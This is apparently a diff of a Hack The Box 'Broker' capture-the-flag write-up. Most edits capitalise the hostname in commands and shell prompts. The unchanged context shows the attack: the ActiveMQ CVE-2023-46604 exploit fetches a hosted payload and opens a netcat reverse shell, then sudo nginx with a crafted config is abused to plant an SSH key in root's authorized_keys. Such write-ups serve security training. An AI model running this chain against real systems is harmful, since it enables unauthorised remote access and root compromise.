@@ -1,4 +1,4 @@
-![](/images/broker/2024-01-22-21-03-03.png)
+![](/images/Broker/2024-01-22-21-03-03.png)
 
 
 # Machine Info
@@ -22,10 +22,10 @@ NSE: Starting runlevel 3 (of 3) scan.
 Initiating NSE at 08:22
 Completed NSE at 08:22, 0.00s elapsed
 Initiating Ping Scan at 08:22
-Scanning broker.htb (10.10.11.243) [4 ports]
+Scanning Broker.htb (10.10.11.243) [4 ports]
 Completed Ping Scan at 08:22, 0.06s elapsed (1 total hosts)
 Initiating SYN Stealth Scan at 08:22
-Scanning broker.htb (10.10.11.243) [65535 ports]
+Scanning Broker.htb (10.10.11.243) [65535 ports]
 Discovered open port 8888/tcp on 10.10.11.243
 Discovered open port 80/tcp on 10.10.11.243
 Discovered open port 22/tcp on 10.10.11.243
@@ -46,7 +46,7 @@ u:admin
 
 p:admin
 
-![](/images/broker/2024-01-22-21-24-15.png)
+![](/images/Broker/2024-01-22-21-24-15.png)
 
 Broker website using `Apache ActiveMQ` . Usually Easy machine using CVE to exploit it . I found `Apache ActiveMQ` Exploit CVE github page here [CVE-2023-46604
 ](https://github.com/evkl1d/CVE-2023-46604)
@@ -56,7 +56,7 @@ Broker website using `Apache ActiveMQ` . Usually Easy machine using CVE to explo
 
 To run the tools . First of all start with python webserver and run python script also running the netcat for revshell
 
-python3 exploit.py -i http://broker.htb -p 80 -u 10.10.10.122:8000/poc.xml
+python3 exploit.py -i http://Broker.htb -p 80 -u 10.10.10.122:8000/poc.xml
 
 file contains `poc.xml`
 
@@ -95,8 +95,8 @@ There send packet to my webserver python
 
 ```
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.11.243 - - [22/Jan//images/broker/2024 23:39:24] "GET /poc.xml HTTP/1.1" 200 -
-10.10.11.243 - - [22/Jan//images/broker/2024 23:39:24] "GET /poc.xml HTTP/1.1" 200 -
+10.10.11.243 - - [22/Jan 2024 23:39:24] "GET /poc.xml HTTP/1.1" 200 -
+10.10.11.243 - - [22/Jan 2024 23:39:24] "GET /poc.xml HTTP/1.1" 200 -
 ```
 
 ```
@@ -105,24 +105,24 @@ listening on [any] 1337 ...
 connect to [10.10.14.122] from (UNKNOWN) [10.10.11.243] 60516
 bash: cannot set terminal process group (884): Inappropriate ioctl for device
 bash: no job control in this shell
-activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
+activemq@Broker:/opt/apache-activemq-5.15.15/bin$ 
 ```
 My revshell has been connected so now i'll do upgrade shell 
 
 
 
 ```
-activemq@broker:/opt/apache-activemq-5.15.15/bin$ script /dev/null -c bash
+activemq@Broker:/opt/apache-activemq-5.15.15/bin$ script /dev/null -c bash
 script /dev/null -c bash
 Script started, output log file is '/dev/null'.
-activemq@broker:/opt/apache-activemq-5.15.15/bin$ ^Z
+activemq@Broker:/opt/apache-activemq-5.15.15/bin$ ^Z
 [1]+  Stopped                 nc -lnvp 9001
 kali@kali$ stty raw -echo ; fg
 nc -lnvp 9001
              reset
 reset: unknown terminal type unknown
 Terminal type? screen
-activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
+activemq@Broker:/opt/apache-activemq-5.15.15/bin$ 
 ```
 
 My revshell has been upgraded . Let's do privilege escalation to get root access
@@ -133,13 +133,13 @@ My revshell has been upgraded . Let's do privilege escalation to get root access
 First of all we start with enumeration . Activemq user can run `nginx` as root without password . 
 
 ```
-activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
-Matching Defaults entries for activemq on broker:
+activemq@Broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
+Matching Defaults entries for activemq on Broker:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
     use_pty
 
-User activemq may run the following commands on broker:
+User activemq may run the following commands on Broker:
     (ALL : ALL) NOPASSWD: /usr/sbin/nginx
 ```
 
@@ -164,13 +164,13 @@ http {
 ```
 
 ```
-activemq@broker:~$ sudo /usr/sbin/nginx -c /tmp/test.conf 
+activemq@Broker:~$ sudo /usr/sbin/nginx -c /tmp/test.conf 
 ```
 i'll running my webserver by sudo nginx with `-c` command to locate path config file and for get root access . Look at the below i got grab `root.txt` file but only can file read only . Let's add new config to got root access 
 
 
 ```
-activemq@broker:/tmp$ curl localhost:1337/root/root.txt
+activemq@Broker:/tmp$ curl localhost:1337/root/root.txt
 a2a56d190a061d847b37c35f0d06bea5
 ```
 
@@ -198,7 +198,7 @@ We need change the port at listen because you can't running same port . I'll run
 
 
 ```
-activemq@broker:~$ sudo /usr/sbin/nginx -c /tmp/t.conf 
+activemq@Broker:~$ sudo /usr/sbin/nginx -c /tmp/t.conf 
 ```
 
 Now running curl command with -X PUT and add your public keys ssh because `PUT` function already added in config nginx so you can use put your files to webserver
@@ -207,14 +207,14 @@ Now running curl command with -X PUT and add your public keys ssh because `PUT` 
 curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYchILzjmmEm2qzhGj0ewpfGQMwfJC83jPMXj0aMOkfpOX/Myw7TbMqH9QvkuWnA+Yi1Jo3n34R865/64lkHXgYTVECH/T0M5Ng+L+BQwwsKwYg5y4nL4FpQV+uAP2eOxR96qBceSIkrGYoYuKzusN3zEkk3HDdvsLBf4b+CPk5GcalIScRcJJPzXcO6KORxqKgPLRoOpccEc4ymNmiQ/GgP0ATxqxDlWwmtLsVw2vF5U/Sw3YPeJ0ztVcoMDj6gEeynVlTVcvgzdrEhM5XKu4uiabbyQ4N201TbImdj1gXNYbcj9AlphhlKvH8Q3wFo8fkbVwj7bM/UcUOTGqHsPAm64nNHRhG8U47raMAt7O7DTlEKE9ZOi0q6Fz7rSZiMxdILBDqa3M6J7ayOg7FkM8DAv+Jey4RzFTEUOMDnrxAxYSbO6QorST6HPz62lMltStM9rMgtw+JdDvq5vVmMqz/nU7o+HjIHpQBAu7OmrGiv+mh7Hsrj76pgBlxFK0kcE= kali@kali'
 ```
 
-I have uploaded my public key to webserver at user root now i can login ssh using my priv8 rsa and login as root broker
+I have uploaded my public key to webserver at user root now i can login ssh using my priv8 rsa and login as root Broker
 
 ```
 ┌──(kali㉿kali)-[~/.ssh]
-└─$ ssh root@broker.htb -i id_rsa  
+└─$ ssh root@Broker.htb -i id_rsa  
 
 
-root@broker:~# id
+root@Broker:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
